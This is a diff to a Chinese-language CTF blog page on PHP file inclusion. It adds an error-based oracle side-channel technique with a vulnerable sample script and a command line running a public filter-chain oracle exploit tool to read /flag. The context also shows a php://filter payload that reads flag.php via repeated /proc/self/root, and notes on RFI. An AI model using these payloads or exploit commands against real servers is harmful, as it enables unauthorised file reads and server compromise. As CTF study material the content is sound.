@@ -39,9 +39,10 @@
 <meta property="og:image" content="https://www.dr0n.top/img/summary/file_include-13.png">
 <meta property="og:image" content="https://www.dr0n.top/img/summary/file_include-14.png">
 <meta property="og:image" content="https://www.dr0n.top/img/summary/file_include-15.png">
+<meta property="og:image" content="https://www.dr0n.top/img/summary/file_include-16.png">
 <meta property="og:image" content="https://www.dr0n.top/img/summary/file_include-4.png">
 <meta property="article:published_time" content="2022-06-23T01:00:00.000Z">
-<meta property="article:modified_time" content="2024-04-28T07:17:10.863Z">
+<meta property="article:modified_time" content="2024-04-28T12:59:17.390Z">
 <meta property="article:author" content="dr0n">
 <meta property="article:tag" content="总结">
 <meta property="article:tag" content="文件包含">
@@ -254,7 +255,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          12k 字
+          13k 字
         
       </span>
     
@@ -265,7 +266,7 @@
         
         
         
-          124 分钟
+          129 分钟
         
       </span>
     
@@ -416,7 +417,7 @@
 <p>payload:<br><code>php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</code></p>
 <p>路径中的<code>/proc/self/root</code>就表示<code>/</code></p>
 <p>具体分析原理的文章：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/213235">php源码分析 require_once 绕过不能重复包含文件的限制</a></p>
-<h2 id="FilterChain-利用"><a href="#FilterChain-利用" class="headerlink" title="FilterChain 利用"></a>FilterChain 利用</h2><p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1395/">hxp CTF 2021 - The End Of LFI?</a></p>
+<h2 id="FilterChain-利用-（iconv-LFI）"><a href="#FilterChain-利用-（iconv-LFI）" class="headerlink" title="FilterChain 利用 （iconv LFI）"></a>FilterChain 利用 （iconv LFI）</h2><p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1395/">hxp CTF 2021 - The End Of LFI?</a></p>
 <h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>利用了PHP Base64 Filter 宽松的解析特性</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//解码的字符串中包含无效字符，那么就会忽略掉那些字符，只对有效字符进行解码</span><br><br>dr0n11       --&gt;  ZHIwbjEx<br>ZH<span class="hljs-meta">&lt;?</span>Iw-bjEx  --&gt;  dr0n11<br></code></pre></td></tr></table></figure>
 
@@ -437,9 +438,20 @@
 <p><img src="/img/summary/file_include-14.png"></p>
 <p>在结尾手动添加一个<code>string.strip_tags</code>，过滤后面的乱字符</p>
 <p><img src="/img/summary/file_include-15.png"></p>
-<h2 id="侧信道读取文件"><a href="#侧信道读取文件" class="headerlink" title="侧信道读取文件"></a>侧信道读取文件</h2><blockquote>
-<p>非常详细的原理解释：<a target="_blank" rel="noopener" href="https://tttang.com/archive/1755">The End of AFR?</a></p>
+<h2 id="侧信道读取文件-基于错误的oracle方式（error-based-oracle）"><a href="#侧信道读取文件-基于错误的oracle方式（error-based-oracle）" class="headerlink" title="侧信道读取文件-基于错误的oracle方式（error-based-oracle）"></a>侧信道读取文件-基于错误的oracle方式（error-based-oracle）</h2><p>与 FilterChain 利用相似</p>
+<p>限制条件：<br>1：php 5.3 以下不能用<br>2：极度依赖系统 iconv 提供的字符集</p>
+<p>例子</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">file</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">0</span>]);<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//2024红明谷</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// flag.php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">hash_file</span>(<span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f&#x27;</span>]);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1755">The End of AFR?</a> 非常详细的解读了工作原理</p>
+<blockquote>
+<p>使用 UCS-4LE 等编码技巧让 PHP 产生内存错误导致服务器产生 500 错误，配合 dechunk 编码使得前面的错误正常化从而获得一个盲注的判断依据，使用该依据以及编码技巧逐个判断盲注出文件内容，进而可以造成任意文件内容读取。</p>
 </blockquote>
+<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p><a target="_blank" rel="noopener" href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">php_filter_chains_oracle_exploit</a></p>
+<p><code>python3 filters_chain_oracle_exploit.py --target http://172.20.35.66/ --parameter 0 --file /flag</code></p>
+<p><img src="/img/summary/file_include-16.png"></p>
 <h1 id="RFI"><a href="#RFI" class="headerlink" title="RFI"></a>RFI</h1><p>远程文件包含（Remote File Inclusion， RFI）是指包含远程服务器上的文件，需要在<code>php.ini</code>中设置<code>allow_url_include=On</code></p>
 <p>远程包含与本地包含没有区别，无非是支持远程加载，更容易getshell，无论是哪种扩展名，只要遵循PHP语法规范，PHP解析器就会对其解析。</p>
 <p>如果过滤了点可以将<code>ip</code>转为<code>int</code></p>
